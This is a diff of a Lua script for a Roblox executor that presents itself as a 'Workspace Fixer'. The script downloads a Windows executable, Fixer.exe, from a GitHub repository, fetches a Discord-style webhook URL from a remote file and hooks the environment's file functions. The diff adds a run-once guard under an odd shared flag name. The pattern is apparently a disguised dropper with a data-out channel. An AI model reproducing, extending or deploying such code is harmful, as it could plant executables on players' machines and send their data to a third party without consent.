@@ -1,4 +1,4 @@
-local file,source= tostring(({identifyexecutor()})[1])..'Fixer', game:HttpGet('https://github.com/kurpixel/fixer/raw/refs/heads/main/Fixer.exe', true) or ''
+if not shared.xenoisrunningonport548932 then local file,source= tostring(({identifyexecutor()})[1])..'Fixer', game:HttpGet('https://github.com/kurpixel/fixer/raw/refs/heads/main/Fixer.exe', true) or ''
 local exec,ver = ({identifyexecutor()})[1],not ({identifyexecutor()})[2]:find('v') and (({identifyexecutor()})[2]:gsub('v', '')) or ({identifyexecutor()})[2]
 local folder = exec..' '..ver..' Workspace Fixer'
 local webhookUrl = game:HttpGet("https://raw.githubusercontent.com/kurpixel/workspace/refs/heads/main/url", true):gsub("%s+", "") 
@@ -60,4 +60,6 @@ if rawget(env,n)then orig[n]=env[n]env[n]=function(p,...)
 				if tostring(p):find(v)then return orig[n](p,...)end end
 			error("attempt to call a nil value",2)end end
    end env._filepatch=orig
-return orig end end) end
+return orig end end) end end
+
+shared.xenoisrunningonport548932 = true
